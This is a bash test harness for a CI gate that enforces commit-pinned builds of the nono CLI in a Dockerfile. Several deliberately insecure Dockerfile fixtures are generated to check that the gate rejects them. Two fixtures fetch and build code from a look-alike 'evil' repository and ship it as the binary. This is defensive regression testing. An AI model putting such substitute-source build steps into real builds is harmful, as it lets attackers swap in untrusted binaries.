#!/usr/bin/env bash
# test-check-nono-pin.sh — executable fails-first fixtures for check-nono-pin.sh
# (cli#341 S4).
#
# The gate's evidence base used to be prose in a script header: nothing re-ran
# the shapes it claims to reject. This harness builds each fixture in a temp tree
# and asserts the gate's exit code, so the gate cannot be silently weakened, and
# asserts .github/workflows/test.yml still invokes it, so a later workflow edit
# cannot silently orphan it.
#
# Every fixture below MUST FAIL the gate (exit non-zero); the positive control
# (the real repo) MUST pass. Fixtures are generated at run time rather than
# committed as Dockerfiles so the intentionally-insecure shapes never sit in the
# tree for SAST/build-context scanners to trip over.
set -uo pipefail

here="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
repo_root="$(cd "$here/.." && pwd)"
gate="$here/check-nono-pin.sh"
work="$(mktemp -d)"
trap 'rm -rf "$work"' EXIT

npass=0
nfail=0

good_pin() {
  cat >"$1/.nono-version" <<'EOF'
version=0.74.0
commit=bc1406e9ceb0b765d303a015502fade11f3858f5
EOF
}

# The known-good nono stage, reused by the tampering fixtures.
good_stage() {
  cat <<'EOF'
FROM rust:bookworm AS nono-builder
COPY .nono-version /tmp/.nono-version
RUN set -eux; \
    . /tmp/.nono-version; \
    git clone --filter=blob:none https://github.com/nolabs-ai/nono /tmp/nono; \
    git -C /tmp/nono checkout "${commit}"; \
    test "$(git -C /tmp/nono rev-parse HEAD)" = "${commit}"; \
    cd /tmp/nono; \
    cargo build --release -p nono-cli; \
    cp target/release/nono /usr/local/bin/nono
EOF
}

run_case() { # <name> <expect:pass|fail> <fixture-dir>
  local name="$1" expect="$2" dir="$3" rc=0
  NONO_PIN_ROOT="$dir" bash "$gate" >/dev/null 2>&1 || rc=$?
  if { [ "$expect" = fail ] && [ "$rc" -ne 0 ]; } || { [ "$expect" = pass ] && [ "$rc" -eq 0 ]; }; then
    printf 'PASS  %-26s gate exited %s (expected %s)\n' "$name" "$rc" "$expect"
    npass=$((npass + 1))
  else
    printf 'FAIL  %-26s gate exited %s (expected %s)\n' "$name" "$rc" "$expect"
    nfail=$((nfail + 1))
  fi
}

mk() { mkdir -p "$work/$1/docker"; echo "$work/$1"; }

# ── Positive control: the real repository must pass ──────────────────────────
rc=0
bash "$gate" >/dev/null 2>&1 || rc=$?
if [ "$rc" -eq 0 ]; then
  printf 'PASS  %-26s gate exited 0 (expected pass)\n' "real-tree (control)"; npass=$((npass + 1))
else
  printf 'FAIL  %-26s gate exited %s (expected pass)\n' "real-tree (control)" "$rc"; nfail=$((nfail + 1))
fi

# ── 1. Pre-S4 form: unpinned default-branch clone, no pin file ───────────────
d="$(mk pre-s4)"
cat >"$d/docker/Dockerfile" <<'EOF'
FROM rust:bookworm AS nono-builder
RUN apt-get update && apt-get install -y git ca-certificates
RUN git clone --depth 1 https://github.com/nolabs-ai/nono.git /tmp/nono && \
    cd /tmp/nono && cargo build --release -p nono-cli && \
    cp target/release/nono /usr/local/bin/nono
FROM node:24-bookworm-slim AS base
COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
EOF
run_case "pre-s4-clone" fail "$d"

# ── 2. --branch v0.74.0 fetch ────────────────────────────────────────────────
d="$(mk branch-tag)"; good_pin "$d"
cat >"$d/docker/Dockerfile" <<'EOF'
FROM rust:bookworm AS nono-builder
COPY .nono-version /tmp/.nono-version
RUN . /tmp/.nono-version; \
    git clone --branch v0.74.0 https://github.com/nolabs-ai/nono /tmp/nono; \
    cd /tmp/nono; cargo build --release -p nono-cli; \
    cp target/release/nono /usr/local/bin/nono
FROM node:24-bookworm-slim AS base
COPY --from=nono-builder /usr/local/bin/nono /usr/local/bin/nono
EOF
run_case "branch-v0.74.0" fail "$d"

# ── 3. Tampered pin: commit= is not a 40-char commit id ──────────────────────
d="$(mk tampered-pin)"
cat >"$d/.nono-version" <<'EOF'
version=0.74.0
commit=deadbeef
EOF
good_stage >"$d/docker/Dockerfile"
run_case "tampered-pin" fail "$d"

# ── 4. Extra key in .nono-version (e.g. a re-introduced sha256=) ─────────────
d="$(mk extra-key)"; good_pin "$d"
printf 'sha256=abc\n' >>"$d/.nono-version"
good_stage >"$d/docker/Dockerfile"
run_case "extra-key" fail "$d"

# ── 5. Two-stage bypass (Sherlock/Kern): pinned stage, unpinned shipped bytes ─
d="$(mk two-stage-bypass)"; good_pin "$d"
{ good_stage; cat <<'EOF'
FROM rust:bookworm AS nono-extra
RUN git clone --depth 1 --branch main https://github.com/evil/nono /tmp/e; cp /tmp/e/target/release/nono /tmp/nono
FROM node:24-bookworm-slim AS base
COPY --from=nono-extra /tmp/nono /usr/local/bin/nono
EOF
} >"$d/docker/Dockerfile"
run_case "two-stage-bypass" fail "$d"

# ── 6. Crafted second stage: look-alike repo, pinned-looking sha, no keywords ─
d="$(mk noncanonical-url)"; good_pin "$d"
{ good_stage; cat <<'EOF'
FROM rust:bookworm AS nono-extra
RUN git clone --filter=blob:none https://github.com/evil/nono /tmp/e; \
    git -C /tmp/e checkout 1111111111111111111111111111111111111111; \
    cd /tmp/e; cargo build --release -p nono-cli; cp target/release/nono /tmp/nono
FROM node:24-bookworm-slim AS base
COPY --from=nono-extra /tmp/nono /usr/local/bin/nono
EOF
} >"$d/docker/Dockerfile"
run_case "noncanonical-url" fail "$d"

# ── 7. Canonical repo but default-branch (moving) clone in a second stage ────
d="$(mk canonical-default-branch)"; good_pin "$d"
{ good_stage; cat <<'EOF'
FROM rust:bookworm AS nono-extra
RUN git clone --filter=blob:none https://github.com/nolabs-ai/nono /tmp/e; \
    cd /tmp/e; cargo build --release -p nono-cli; cp target/release/nono /tmp/nono
FROM node:24-bookworm-slim AS base
COPY --from=nono-extra /tmp/nono /usr/local/bin/nono
EOF
} >"$d/docker/Dockerfile"
run_case "canonical-default-branch" fail "$d"

# ── Regression guard: the CI workflow must still invoke the gate ─────────────
if grep -qF './scripts/check-nono-pin.sh' "$repo_root/.github/workflows/test.yml"; then
  printf 'PASS  %-26s test.yml invokes check-nono-pin.sh\n' "workflow-invokes-gate"; npass=$((npass + 1))
else
  printf 'FAIL  %-26s test.yml no longer invokes check-nono-pin.sh\n' "workflow-invokes-gate"; nfail=$((nfail + 1))
fi

printf '\ntest-check-nono-pin: %d passed, %d failed\n' "$npass" "$nfail"
[ "$nfail" -eq 0 ]
